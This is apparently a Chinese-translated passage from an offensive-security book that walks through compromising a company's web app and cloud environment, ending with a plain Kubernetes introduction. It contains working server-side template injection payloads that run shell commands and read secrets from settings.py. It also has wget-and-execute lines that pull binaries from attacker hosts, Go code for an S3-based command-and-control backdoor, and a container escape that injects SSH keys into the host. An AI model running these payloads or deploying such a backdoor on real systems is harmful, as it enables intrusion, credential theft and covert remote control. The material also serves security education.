email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()}}...

[<class 'type'>,

<class 'dict_values'>,

<class 'django.core.handlers.wsgi.LimitedStream'>,

<class 'urllib.request.OpenerDirector'>,

<class '_frozen_importlib._ModuleLock'>,

<class 'subprocess.Popen'>, ①

--snip--

<class 'django.contrib.auth.models.AbstractUser.Meta'>,

]
```

出现了超过 300 个类。这些都是直接继承自 `object` 类并由当前 Python 解释器加载的类。

> NOTE
在 Python 3 中，所有顶级类都是 `object` 类的子类。在 Python 2 中，类必须显式继承 `object` 类。

我希望你注意到了 `subprocess.Popen` 类 ①！这是用于执行系统命令的类。我们可以在这里、现在通过引用其在子类列表中的偏移量来调用该对象，在这种特定情况下，该偏移量恰好是 282（通过手动计数得出）。我们可以使用 `communicate` 方法捕获 `env` 命令的输出：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]("env", shell=True, stdout=-1).communicate()[0]}}...
```

几秒钟后，我们收到一封电子邮件，其中泄露了机器上运行的 Python 进程的环境变量：

```
PWD=/opt/django/surveysapp

PYTHON_GET_PIP_SHA256=8d412752ae26b46a39a201ec618ef9ef7656c5b2d8529cdcbe60cd70dc94f40c

KUBERNETES_SERVICE_PORT_HTTPS=443

HOME=/root

--snip--
```

我们刚刚实现了任意代码执行！让我们看看有什么有用的东西。所有 Django 设置通常都声明在一个名为 `settings.py` 的文件中，该文件位于应用程序根目录。此文件可以包含从管理员电子邮件的简单声明到机密 API 密钥的任何内容。我们从环境变量中知道应用程序的完整路径是 `/opt/Django/surveysapp`，并且设置文件通常位于其下方的一个目录（同名）。在列表 6-1 中，我们尝试访问它。

```
#### Payload
```



`email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]("cat /opt/Django/surveysapp/surveysapp/settings.py", shell=True, stdout=-1).communicate()[0]}}...`

`BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))`

`SERVER_EMAIL = "no-reply@surveysandstats.com"`

`SES_RO_ACCESSKEY = "AKIA4ZRKGWSSKDSKJP V"` ①

`SES_RO_SECRETKEY = "MopQIv3FIDXnbyNFQurMZ9ynxD0gdNkRUP1r0O3Z"` ②

--snip--

```
清单 6-1：访问 surveysandstats.com 设置文件
```

我们获得了 SES ① ②（Simple Email Service，简单邮件服务）的一些凭证，这是一项由 AWS 管理的邮件服务，提供 SMTP 网关、POP3 服务器等。这完全在意料之中，因为该应用程序的主要活动是向候选人发送邮件结果。

这些凭证可能具有非常狭窄的作用范围，例如发送邮件。我们可以尝试发挥创意，利用这一新获得的能力钓鱼一些管理员，但目前，这些凭证将服务于一个更紧迫的目标：在我们花费更多时间之前，确认 `surveysandstats.com` 确实属于 MXR Ads 或至少运行在相同的 AWS 环境中。

#### 确认所有者

你可能还记得，我们在第 4 章猎取 Gist 和 Pastebin 上的公开笔记时发现了可疑的 `surveysandstats.com` 网站。就我们所知，这可能是一个与我们真正目标完全无关的独立组织。让我们弄清楚。首先，我们将尝试获取账户 ID，这只需要一次 API 调用，并且不需要任何特殊权限，因此我们可以使用刚刚找到的 SES 密钥。每个 AWS IAM 用户默认都可以访问此信息。在清单 6-2 中，我们使用从清单 6-1 获得的访问密钥 ① 和密钥 ② 来获取账户 ID。

```
root@Point1:~/# vi ~/.aws/credentials

[ses]

aws_access_key_id = AKIA4ZRKGWSSKDSKJP V

aws_secret_access_key = MopQIv3FIDXnbyNFQurMZ9ynxD0gdNkRUP1r0O3Z

root@Point1:~/# aws sts get-caller-identity --profile ses

{
  "UserId": "AIDA4XSWK3WS9K6IDDDOV",
  "Account": "886371554408",
  "Arn": "arn:aws:iam::886371554408:user/ses_ro_user"
}
```

清单 6-2：追踪 surveysandstats.com 账户 ID

正中目标：`886371554408` 与我们在第 5 章为 MXR Ads 演示应用程序找到的 AWS 账户 ID 相同。我们成功了！

#### 桶走私

现在，我们只想部署一个反向 shell，然后安静地喝杯咖啡，同时让某个后利用插件筛选数 GB 的数据，寻找密码、密钥和其他宝物。但生活并不总是配合。

当我们尝试从我们在第 3 章作为攻击基础设施创建的自定义域名加载任何文件时，请求永远无法到达目的地：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]["wget https://linux-packets-archive.com/runccd; chmod +x runccd; ./runccd&", shell=True, stdout=-1).communicate()[0]}}...

<empty>
```

似乎有某种过滤器阻止了发往外部世界的 HTTP 请求。合理。我们将尝试反向操作并查询元数据 API `169.254.169.254`。这个默认的 AWS 端点帮助我们在第 5 章中获取了有关演示应用程序的许多信息。希望它能给我们更多可用的凭证……或者没有：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]["curl http://169.254.169.254/latest", shell=True, stdout=-1).communicate()[0]}}...

<empty>
```

不幸的是，每次我们利用这个 SSTI 漏洞时，我们都会触发携带命令输出的邮件。这可不是一个隐蔽的攻击向量。MXR Ads 确实在锁定其出站流量方面做得很好。虽然这是一个常见的建议，但很少有公司真正敢于在其机器上系统地实施流量过滤，主要是因为它需要大量的设置来处理一些合法的边缘情况，例如检查更新和下载新软件包。我们在第 5 章遇到的 `mxrads-dl` 桶现在完全说得通了：它必须充当一个本地仓库，镜像服务器所需的所有公共软件包。维护起来并不容易，但在这种情况下却物有所值。

不过有一个问题：MXR Ads 如何明确允许流向 `mxrads-dl` 桶的流量？安全组（AWS 防火墙规则）是第 4 层组件，只能理解 IP 地址，而在 S3 桶的情况下，IP 地址可能会根据许多因素而变化。那么 `surveysandstats.com` 网站如何仍能访问 `mxrads-dl` 桶，却无法向互联网其余部分发送数据包？

一个可能的解决方案是在特定区域中将 S3 的所有 IP 范围列入白名单，例如 `52.218.0.0/17`、`54.231.128.0/19` 等等。然而，这种方法很丑陋，最多只能勉强工作，几乎无法完成任务。

更具可扩展性和云友好性的做法是创建 S3 VPC 端点（详情请参阅 https://docs.aws.amazon.com/glue/latest/dg/vpc-endpoints-s3.html）。听起来比实际更简单：一个 *virtual private cloud (VPC)* 是一个隔离的私有网络，企业在其上运行机器。它可以像任何常规路由器接口一样被划分为多个子网。AWS 可以将一个特殊的端点 URL 插入该 VPC，以将流量路由到其核心服务，如 S3。机器无需通过互联网访问 S3，而是联系该特殊 URL，后者通过 Amazon 内部网络将流量引导至 S3。这样，与其将外部 IP 列入白名单，不如简单地将 VPC 的内部范围（`10.0.0.0/8`）列入白名单，从而避免任何安全问题。

然而魔鬼在细节中，因为 VPC 端点只知道机器试图访问的 AWS 服务。它不关心桶或正在查找的文件。桶甚至可能属于另一个 AWS 账户，流量仍会通过 VPC 端点流向其目的地！因此，从技术上讲，即使 MXR Ads 看似将调查应用程序与互联网隔绝，我们仍可以走私一个请求到我们自己的 AWS 账户中的桶，并让应用程序运行我们控制的文件。让我们测试这个理论。

我们将上传一个名为 *beaconTest.html* 的虚拟 HTML 文件到我们的其中一个桶中，并通过授予每个人 *GetObject* 权限使其公开。

我们首先创建一个名为 `mxrads-archives-packets-linux` 的桶：

```bash
root@Point1:~# aws s3api create-bucket \
--bucket mxrads-archives-packets-linux \
--region=eu-west-1 \
--create-bucket-configuration \
LocationConstraint=eu-west-1
```

接下来，我们向桶上传一个虚拟文件并将其命名为 *beaconTest.html*：

```bash
root@Point1:~# aws s3api put-object \
--bucket mxrads-archives-packets-linux \
--key beaconTest.html \
--body beaconTest.html
```

然后我们使该文件公开：

```bash
root@Point1:~# aws s3api put-bucket-policy \
--bucket mxrads-archives-packets-linux \
--policy file://<(cat <<EOF
{
  "Id": "Policy1572645198872",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Stmt1572645197096",
      "Action": [



```
        "s3:GetObject", "s3:PutObject"
      ],

      "Effect": "Allow",

      "Resource": "arn:aws:s3:::mxrads-archives-packets-linux/*",

      "Principal": "*"

    }

  ]

}

EOF)
```

最后，我们通过 `surveysandstats.com` 网站获取 `beaconTest.html`。如果一切按预期进行，我们应该在响应中获得虚拟 HTML 内容：

```
#### Payload to the surveysandstats site form

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282](" curl https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/beaconTest.html, shell=True, stdout=-1).communicate()[0]}}...

#### Results in email

<html>hello from beaconTest.html</html>
```

这是一个大胆的尝试，但男孩，它确实奏效了！我们找到了一个可靠的方法，可以从这个原本封闭的调查应用程序与外部世界通信。使用 S3 文件，我们现在可以设计一种准交互式协议，在这台隔离的机器上执行代码。

#### 使用 S3 的高质量后门

我们将开发一个代理-操作员系统，以便在 `surveysandstats` 机器上轻松执行代码并检索输出。我们服务器上的第一个程序称为操作员，它会将命令写入名为 `hello_req.txt` 的文件。调查站点上运行的第二个程序——代理——每隔几秒获取一次 `hello_req.txt`，执行其内容，并将结果上传到 S3 上的文件 `hello_resp.txt`。我们的操作员将定期检查此文件并打印其内容。此交换在图 6-7 中说明。

![](img/961e81aef23040d0fbe348f58c055860_117_0.png)

图 6-7：通过 S3 文件执行命令

操作员将完全访问 `mxrads-archives-packets-linux` 桶，因为它将在我们自己的受信任服务器上运行，并且具有所需的 AWS 凭证。代理只需要对 `hello_resp.txt` 文件具有 `PutObject` 权限，对 `hello_req.txt` 具有 `GetObject` 权限。这样，即使分析人员靠得太近，他们也只能瞥见发送的最后一条命令，而看不到实际的响应。

> **NOTE**
>
> *为了满足我们最严格、最变态和最偏执的反射，我们还可以添加 S3 生命周期策略以在几秒后自动删除文件（在 https://docs.aws.amazon.com/ 搜索对象生命周期管理）并使用在运行时生成的动态密钥加密数据。*

我已在 GitHub 上提供了操作员和代理的基础实现 `https://github.com/HackLikeAPornstar/GreschPolitico/tree/master/S3Backdoor/`，如果你想玩弄它们、调整它们并添加更多功能。我们将在以下章节中介绍代码的一些亮点。

#### 创建代理

如你从仓库中瞥见的那样，我决定用 Golang 编写代理，因为它速度快，生成静态链接的可执行文件，而且比 C/C++ 更具生产力、更友好。`main` 函数设置所需变量，如文件名和 HTTP 连接器，然后进入主循环，如清单 6-3 所示。

```go
func main() {
    reqURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_req.txt", *bucket, *key)
    respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_resp.txt", *bucket, *key)
    client := &http.Client{}
}
```

清单 6-3：设置代理变量

我们与 S3 的交互将通过 HTTP REST 查询进行（`GET` 用于获取内容，`PUT` 用于上传数据），以避免与机器角色的任何奇怪权限重叠。有关应实施的适当 S3 策略，请参阅本书资源 `https://nostarch.com/how-hack-ghost/`。

在清单 6-4 中，我们通过每两秒执行一次 `fetchData` 方法，将代理设置为从 `reqURL` 下载要执行的数据。

```go
for {
    time.Sleep(2 * time.Second)
    cmd, etag, err = fetchData(client, reqURL, etag)
    --snip--
    go func() {
        output := execCmd(cmd)
        if len(output) > 0 {
            uploadData(client, respURL, output)
        }
    }()
}
```

清单 6-4：下载数据

如果文件自上次访问以来已被更改（HTTP 状态码 `200` 表示已更改），则可通过 `execCmd` 方法执行新命令。否则，我们会收到 HTTP `304`（未修改）响应，并在几秒后静默重试。

`NOTE` 我在这里不会深入 `ETag` 头部，但如果你想了解更多，请查看 `https://www.logicbig.com/`。

结果随后会发送回存储桶（通过 `uploadData` 方法）。下一节，清单 6-5 所示，创建了 `uploadData` 方法。

```go
func uploadData(client *http.Client, url string, data []byte) error {
    req, err := http.NewRequest("PUT", url, bytes.NewReader(data))
    req.Header.Add("x-amz-acl", "bucket-owner-full-control")
    _, err = client.Do(req)
    return err
}
```

清单 6-5：代理的 `uploadData` 方法

`uploadData` 方法是一个经典的 HTTP `PUT` 请求，但这里有一个额外的细微差别：`x-amz-acl` 头。该头指示 AWS 将上传文件的所有权转移给目标存储桶所有者，也就是我们。否则，文件将保留其原始所有权，我们将无法使用 S3 API 检索它。如果你对 `execCmd`、`fetchData` 和 `uploadData` 函数的构造感兴趣，请不要犹豫查看本书 GitHub 仓库中的代码。

编写此类代理的首要关键要求是稳定性。我们将把它投放到敌后，因此需要妥善处理所有错误和边缘情况。错误的异常可能会导致代理崩溃，进而导致我们的远程访问中断。谁知道模板注入漏洞第二天是否还存在？

Golang 通过根本没有异常来处理异常。大多数调用返回应在使用前检查的错误代码。只要我们严格遵循这种做法，同时再加上一些良好的编码实践，例如在取消引用之前检查 `nil` 指针，我们应该相对安全。其次是并发。我们不希望程序因为忙于运行一个耗尽代理资源 20 分钟的 `find` 命令而丢失。那就是为什么我们将 `execCmd` 和 `uploadData` 方法封装在 `goroutine` 中（前缀 `go func()...`）。

可以将 `goroutine` 视为与代码其余部分并行运行的一组指令。所有例程共享主程序的同一线程，从而节省了一些数据结构以及内核在线程之间跳转时通常执行的昂贵上下文切换。为了做一个实际的比较，`goroutine` 分配大约 `4KB` 的内存，而操作系统线程大约占用 `1MB`。你可以在普通计算机上轻松运行数十万个 `goroutine` 而不会感到吃力。

我们将源代码编译成名为 `runcdd` 的可执行文件并上传到我们的 S3 存储桶中，让它待命，随时待命：

```
root@Point1:~/# git clone https://github.com/HackLikeAPornstar/GreschPolitico
root@Point1:~/# cd S3Backdoor/S3Agent
root@Point1:~/# go build -ldflags="-s -w" -o ./runcdd main.go
root@Point1:~/# aws s3api put-object \
--bucket mxrads-archives-packets-linux \
--key runcdd \
--body runcdd
```



Go 的几个烦人之处之一是它会用符号、文件路径和其他泄露数据来膨胀最终的二进制文件。我们使用 `-s` 标志剥离一些符号，使用 `-w` 剥离调试信息，但要知道分析人员可以挖掘出大量有关用于生成此可执行文件的环境的信息。

### 创建操作员

操作员部分遵循非常相似但相反的逻辑：它推送命令并检索结果，同时模仿交互式 shell。你将在同一仓库中找到代码——这次是用 Python：

```
root@Point1:~/S3Op/# python main.py

Starting a loop fetching results from S3 mxrads-archives-packets-linux

Queue in commands to be executed

shell>
```

我们前往 *surveysandstats.com* 上的易受攻击表单并提交以下有效负载以下载并运行代理：

#### Payload to the surveysandstats site form

```
email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]("wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/runcdd %3B chmod %2Bx runcdd %3B ./runcdd%26, shell=True, stdout=-1).communicate()[0]}}...
```

解码后，负载为多行：

```
wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/runcdd

chmod +x runcdd

./runcdd &
```

我们然后在自己的机器上运行操作员：

```
root@Point1:~/S3Fetcher/# python main.py

Starting a loop fetching results from S3 mxrads-archives-packets-linux

New target called home d5d380c41fa4

shell> id

Will execute id when victim checks in
① uid=0(root) gid=0(root) groups=0(root)
```

这花了一些时间，但我们终于在 MXR Ads 的受信任环境中获得了一个功能性的 shell ①。好戏开始了。

### SSRF 替代方法

我们选择通过 S3 存储桶来绕过网络限制，但如果你还记得，我们已经遇到了不受这些限制的应用：第五章的演示应用。我们完全可以利用之前发现的 SSRF 漏洞来设计一个准双工通信通道，使用以下步骤：

- 1. 我们通过 AWS 元数据检索演示应用的内部 IP。
- 2. 我们找到演示应用使用的内部端口。我们从调查网站发出多个 curl 查询，直到命中实际使用的端口（3000、5000、8080、8000 等）。
- 3. 我们编写一个代理程序，持续要求演示应用截取我们的攻击服务器的屏幕。
- 4. 我们的操作员等待攻击服务器上的查询，并在诱饵 HTML 页面中提供要运行的命令。
- 5. 代理提取命令并通过演示应用再次在 URL 参数中发送回响应。
- 6. 操作员程序接收 URL 并打印输出。

我更倾向于关注 S3 场景，因为它更常见，在现实生活中也更有可能证明更有帮助。

### 尝试突破

我们终于进入了 MXR Ads 珍贵 VPC 中的一台服务器，并且拥有 root 访问权限……还是不？现在还有人把生产应用作为 root 运行吗？很有可能，我们实际上只是在容器内部，而此命名空间中的用户“root”映射到主机上的某个随机无特权用户 ID。

一种快速证实我们假设的方法是更仔细地查看 PID 号为 1 的进程：检查其命令行属性、cgroups 和挂载文件夹。我们可以在 `/proc` 文件夹中探索这些不同的属性——一个虚拟文件系统，存储有关进程、文件句柄、内核选项等的信息（见清单 6-6）。

```
shell> id

uid=0(root) gid=0(root) groups=0(root)

shell> cat /proc/1/cmdline

/bin/sh

shell> cat /proc/1/cgroup

11:freezer:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541
```

```
10:blkio:/docker/Sea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
9:cpuset:/docker/Sea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
--snip--
shell> cat /proc/1/mounts

overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/1/6CWK4O7ZJREMTOZGIKSF5XG6HS
```

Listing 6-6: 列出 `/proc` 文件夹中 PID 为 1 的进程的属性

我们可以继续下去，但从 cgroup 名称和挂载点中提到的 Docker 可以很明显地看出，我们被困在了容器内部。此外，在典型的现代 Linux 系统中，启动第一个进程的命令应类似于 `/sbin/init` 或 `/usr/lib/systemd`，而不是 `/bin/sh`。

即便在容器内部拥有 root 权限，仍然可以让我们安装软件包并访问受 root 保护的文件，但请注意，我们只能对属于我们狭窄且非常有限的命名空间的资源行使这种权力。

在进入容器后，最初的本能反应之一就是检查它是否以特权模式运行。

### 检查特权模式

在特权执行模式下，Docker 仅充当打包环境：它维护命名空间隔离，但授予对所有设备文件（如硬盘）以及所有 Linux 能力（下一节将详细介绍）的广泛访问权限。

因此，容器可以修改主机系统上的任何资源，例如内核功能、硬盘、网络等等。如果我们发现处于特权模式，就可以直接挂载主分区，将 SSH 密钥放入任何主目录，并打开主机上的新管理员 shell。以下是实验室中对此的快速概念验证，仅供说明：

#### Demo lab

```
root@DemoContainer:# ls /dev

autofs      kmsg        ppp         tty10

bsg         lightnvm    psaux       tty11
--snip--
#### tty devices are usually filtered out by cgroups, so we must be inside a privileged container
root@DemoContainer:# fdisk -l

Disk /dev/dm-0: 23.3 GiB, 25004189184 bytes, 48914432 sectors

Units: sectors of 1 * 512 = 512 bytes
--snip--
#### mount the host's main partition
root@DemoContainer:# mount /dev/dm-0 /mnt && ls /mnt

bin  dev  home  lib  lost+found  mnt  proc...
#### inject our SSH key into the root home folder
root@DemoContainer:# echo "ssh-rsa AAAAB3NzaC1yc2EA..." > /mnt/root/.ssh/authorized_keys
```

```
#### get the host's IP and SSH into it
root@DemoContainer:/# ssh root@172.17.0.1

root@host:/#
```



> NOTE
即使在特权容器内部，未特权的用户也无法轻易使用此技术突破，因为 `mount` 命令将无法工作。他们需要先提升自己的权限，或例如攻击同一主机上暴露端口的其他容器。

你会认为没有人敢在特权模式下运行容器，尤其是在生产环境中，但生活充满惊喜，有些人可能确实需要它。举例来说，一名开发者需要调整像 TCP 超时值这样简单的东西（一个内核选项）。为此，开发者自然会浏览 Docker 文档，并遇到 `sysctl` Docker 标志，该标志本质上是在容器内部运行 `sysctl` 命令。然而，运行此命令时，当然无法更改内核 TCP 超时选项，除非以特权模式调用。把容器置于特权模式存在安全风险这一事实，甚至不会进入这位开发者的脑海——`sysctl` 毕竟是 Docker 文档中描述的官方且受支持的标志，天哪！

### Linux 能力

现在我们可以回到我们的调查应用，检查是否可以轻松破坏命名空间隔离。我们列出 `/dev` 文件夹的内容，但结果缺少所有暗示特权模式的经典伪设备文件，如 `tty*`、`sda` 和 `mem`。一些管理员用特权模式换取一组单独的权限或能力。可以把能力看作是对 Linux 上通常归于全能 root 用户的权限的细粒度分解。拥有 `CAP_NET_ADMIN` 能力的用户将被允许对网络栈执行 root 操作，例如更改 IP 地址、绑定到较低端口以及进入混杂模式嗅探流量。然而，该用户将被禁止挂载文件系统，例如。此操作需要 `CAP_SYS_ADMIN` 能力。

> NOTE
可以说，鉴于其授予的权限数量，`CAP_SYS_ADMIN` 能力 就是新的 root。

当容器所有者使用 `--add-cap` 标志指示时，Docker 可以为容器附加额外的能力。其中一些强大的能力可以被利用来破坏命名空间隔离并访问其他容器，甚至通过嗅探路由到其他容器的报文、加载在主机上执行代码的内核模块或挂载其他容器文件系统来危害主机。

我们通过检查 `/proc` 文件系统列出 `surveysapp` 容器的当前能力，然后使用 `capsh` 工具将它们解码为有意义的权限：

```
shell> cat /proc/self/status |grep Cap

CapInh: 00000000a80425fb

CapPrm: 00000000a80425fb

CapEff: 00000000a80425fb

CapBnd: 00000000a80425fb

CapAmb: 0000000000000000
```

```
root@Bouncer:/# capsh --decode=00000000a80425fb

0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,...
```

我们当前用户的有效和允许的能力是 `CapPrm` 和 `CapEff`，这相当于我们在容器内部作为 root 可以预期的正常权限集：杀死进程（`CAP_KILL`）、更改文件所有者（`CAP_CHOWN`）等等。所有这些操作都严格限制在当前命名空间内，因此我们仍然基本上被困住了。

### 能力的复杂性

能力很快就会变得复杂，尤其是在运行时处理方式上。当创建子线程时，内核会为其分配多个能力列表，其中最重要的两个是有效（`CapEff`）和允许（`CapPrm`）能力集。`CapEff` 反映的是可以立即行使的本地权限，而 `CapPrm` 中的能力只有在执行特定的 `capset` 系统调用获取该权限后才能使用（`capset` 会在 `CapEff` 中设置相应的位）。

`CapPrm` 是三个输入的总和：
- 在父进程的可继承能力（`CapInh`）和磁盘上对应文件 的可继承能力 中同时找到的通用能力。此操作通过按位与执行，因此例如一个没有能力的文件会使此输入失效。
- 可执行文件的允许能力（`CapPrm`），前提是它们落在父进程允许的最大能力集（`CapBnd`）范围内。
- 父进程的环境能力（`CapAmb`）。父进程从其 `CapPrm` 和 `CapInh` 中挑选适当的能力并将其添加到 `CapAmb` 列表，以便传递给子进程。`CapAmb` 仅作为一种技巧存在，允许没有文件能力的“常规”脚本继承调用者的一些能力。换句话说，即使此列表的第一个输入被否定，父进程仍可将其可继承或允许的能力注入子进程。如果可执行文件具有能力，则忽略此第三个输入。

如果文件设置了有效位，则子进程的 `CapEff` 列表等于其 `CapPrm`；否则，它由 `CapAmb` 填充。可继承能力（`CapInh`）和受限能力（`CapBnd`）按原样传递给子进程。

在你开始装填霰弹枪之前，请知道我写这些只是为了说明确定分配给新进程的能力集有多么棘手。我鼓励你深入研究该主题并学习如何在容器中利用能力。你可以从 Adrian Mouat 的优秀介绍“Linux Capabilities: Why They Exist and How They Work”开始，网址为 https://blog.container-solutions.com/，以及 https://man7.org/ 上第 7 节中关于能力的官方 Linux 内核手册页。

### Docker 套接字

接下来我们查找 `/var/run/docker.sock` 文件，它是用于与主机上 Docker 守护进程通信的 REST API。如果我们能从容器内部访问此套接字，例如使用简单的 `curl`，我们就可以指示它启动一个特权容器，然后获得对主机系统的 root 访问权限。我们首先检查 `docker.sock`：

```bash
shell> curl --unix-socket /var/run/docker.sock http://localhost/images/json

curl: (7) Couldn't connect to server

shell> ls /var/run/docker.sock

ls: cannot access '/var/run/docker.sock': No such file or directory

shell> mount | grep docker
```

#### docker.sock not found

那里没有运气。我们然后检查内核版本，希望找到一个有已知漏洞可以利用来进入主机的版本，但再次无功而返。该机器运行的是 4.14.146 内核，在我运行此操作时，它仅比最新版本落后几个版本：

```bash
shell> uname -a

Linux f1a7a6f60915 4.14.146-119.123.amzn2.x86_64 #1
```

总体而言，我们作为一个相对无力的 root 用户运行在更新且没有明显错误配置或漏洞的机器内部。我们始终可以在实验室中设置类似的内核，然后深入研究内存结构和系统调用，直到找到破坏命名空间隔离的零日漏洞，但让我们把这作为最后的手段。

任何被困在笼子里的理智之人的第一冲动就是试图挣脱。这是一种高尚的情感。但如果我们可以在身后关上栅栏的情况下实现最狡猾的目标，为什么一开始还要花时间锯开它们呢？

能够进入主机并可能检查其他容器当然很棒，但鉴于当前环境，我认为是时候我们从铁窗前退后，放下无用的钝刺刀，转而关注更大的图景了。

别再想着从这台微不足道的单台主机中逃脱了。何不一举摧毁整层楼——不，是整栋大楼？那才是一个值得讲述的故事。

还记得我们在第92页“任意代码执行”中如何转储环境变量吗？我们确认了模板注入漏洞，并聚焦于与 Django 相关的变量，因为那是当时的主要任务，但如果你足够留意，或许已经瞥见了更重要得多的东西。更宏大得多的东西。

让我再展示一次输出：

```
shell> env

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

HOME=/root

KUBERNETES_SERVICE_PORT_HTTPS=443

KUBERNETES_PORT_443_TCP_PORT=443

KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443

--snip--
```



我们运行在 Kubernetes 集群管理的容器内部！别管这台孤单、超负荷的工作节点机器了；我们有机会把整个王国都拉下马！

### Resources

- Burp 以其 Active Scanner 著称，它能自动化大部分参数侦察阶段。或者，你可以尝试一些用于模糊测试各种漏洞的扩展。Snoopy Security 在 https://github.com/snoopyscurity/awesome-burp-extensions/ 维护了一个有趣的此类扩展汇编。
- 查看 James Kettle 的演讲“Server-Side Template Injection: RCE for the Modern Webapp”，以了解各种利用技术：https://www.youtube.com/watch?v=3cT0uE7Y87s。
- Docker 参考文档可在 https://dockr.ly/2sgaVhj 获取。
- 一篇关于容器逃逸的优秀文章是“The Route to Root: Container Escape Using Kernel Exploitation”，其中 Nimrod Stoler 使用 CVE-2017-7308 来逃逸隔离：http://bit.ly/2TfJZHV1。
- 在 https://unit42.paloaltonetworks.com/ 查找其他漏洞的描述。

## 7

## BEHIND THE CURTAIN

![](img/961e81aef23040d0fbe348f58c055860_127_0.png)

也许你一有新潮技术上市就紧跟其后。也许你太忙于攻破 Windows 域，根本无暇关注自己领域之外的最新趋势。但无论你过去几年像个弃儿一样隐居，还是四处参加会议巡回，你一定听过关于某种神奇新生物 Kubernetes 的传闻和窃窃私语，它是终极的容器编排和部署解决方案。

Kube 迷会告诉你，这项技术解决了管理员和 DevOps 的所有最大挑战。它开箱即用。他们声称这是魔法。好吧，给一个无助的人穿上翼装，指向远山上一个小洞，然后把他推下去。Kubernetes 并非魔法。它很复杂。它是一团混乱的、相互冲突的成分以某种方式纠缠在一起的意大利面条，被每个人最讨厌的宿敌 `iptables` 和 `DNS` 束缚着。

对我们黑客来说最好的部分是什么？在首次公开发布后，团队花了整整两年才推出安全功能。人们可以争论他们的优先级，但我个人很感激。如果受过训练、薪水高昂的工程师在 2017 年设计无认证 API 和不安全系统，我有什么好争论的？任何帮助都非常感激，朋友们。

话虽如此，我认为 Kubernetes 是一项强大且颠覆性的技术。它很可能留下来，并且有潜力在公司的架构中发挥如此关键的作用，以至于我觉得有必要介绍一下其内部工作原理的速成课程。如果你已经从零部署过集群或编写过自己的控制器，可以跳过本章。否则，请留下来。你可能不会成为 Kube 专家，但我向你保证，你将足够了解如何入侵一个。

黑客无法满足于“魔法”这种说法。我们将拆解 Kube，探索其组件，并学习识别一些常见的错误配置。MXR Ads 将是完美的试验场。准备好入侵一些 Kube 吧！

### Kubernetes Overview

Kubernetes 是对“如何高效管理一千个容器？”这一问题的答案。如果你稍微玩一下我们在第 3 章搭建的基础设施中的容器，你很快就会遇到一些令人沮丧的限制。例如，要部署容器镜像的新版本，你必须修改用户数据并重启或推出新机器。想想看：要重置几组进程，一个本应只需几秒的操作，你却必须配置一台全新的机器。同样，动态扩展环境——比如你想将容器数量翻倍——的唯一方法就是增加机器并将其隐藏在负载均衡器后面。我们的应用程序以容器形式存在，但我们只能在机器层面操作。

Kube 通过提供一个环境来解决这个问题以及更多问题，该环境可在多台机器上高效运行、管理并调度容器。想再添加两个 Nginx 容器？没问题。只需要一条命令：

```
root@DemoLab:/# kubectl scale --replicas=3 deployment/nginx
```

想更新生产环境中部署的 Nginx 容器的版本？现在无需重新部署机器。只需让 Kube 推出新更新，且不会停机：

```
root@DemoLab:/# kubectl set image deployment/nginx-deployment\
nginx=nginx:1.9.1 --record
```

想在 VPC `vpc-b95e4bdf` 上的机器 `i-1b2ac87e65f15` 上运行的容器编号 7543 上立即获得一个 shell？别再费心获取主机 IP、注入私钥、SSH、docker exec 等了。现在不是 2012 年了！从你的笔记本上执行一个简单的 `kubectl exec` 就足够了：

```
root@DemoLab:/# kubectl exec sparcflow/nginx-7543 bash
root@sparcflow/nginx-7543:/#
```

NOTE
当然，这里为了论证方便我们做了一些简化。需要有有效的凭证、访问 API 服务器以及适当的权限。稍后会详细介绍。

难怪这头庞然大物征服了 DevOps 社区每个人的心智。它优雅、高效，而且直到不久前，非常不安全！就在两年前左右，你只需指向一个单一 URL，就可以在没有任何身份验证的情况下执行上述所有操作甚至更多。Nichts, zilch, nada。而那只是其中一个入口点；另外三个也提供了类似的访问权限。那是残酷的。

然而，在过去两年左右，Kubernetes 实施了许多新的安全功能，从基于角色的访问控制到网络过滤。虽然一些公司仍在使用 1.8 之前的集群，但大多数都在运行相对更新的版本，因此我们将处理一个完全修补并加固的 Kubernetes 集群以增加难度。

在本章剩余部分，想象一下我们有一组由 AWS 提供的约一百台机器，完全受 Kubernetes 的意志和疏忽支配。它们整体构成了我们通常所说的 Kubernetes 集群。我们将在拆解整个系统之前先玩一些基础命令，因此请容忍接下来几段中的部分信息。最终一切都会串联起来。

NOTE
如果你想跟上进度，我鼓励你使用 Minikube（https://minikube.sigs.k8s.io/docs/start/）免费启动一个 Kubernetes 集群。它是一个在 VirtualBox/KVM（基于内核的虚拟机）上运行单节点集群的工具，允许你试验命令。

### Introducing Pods

我们对 Kubernetes 的探索始于运行应用程序的容器。该应用程序严重依赖于另一个带有小型本地数据库的容器来回答查询。这就是 Pod 登场的地方。Pod 本质上是一个或多个被 Kubernetes 视为单一单元的容器。Pod 内的所有容器将被一起调度、一起启动并一起终止（见图 7-1）。

你与 Kubernetes 交互最常见的方式是通过提交清单文件。这些文件描述了基础设施的期望状态，例如

例如哪些 Pod 应该运行、它们使用哪个镜像、如何相互通信等等。Kubernetes 中的一切都围绕着这个期望状态展开。事实上，Kube 的主要任务就是使该期望状态成为现实并保持其不变。

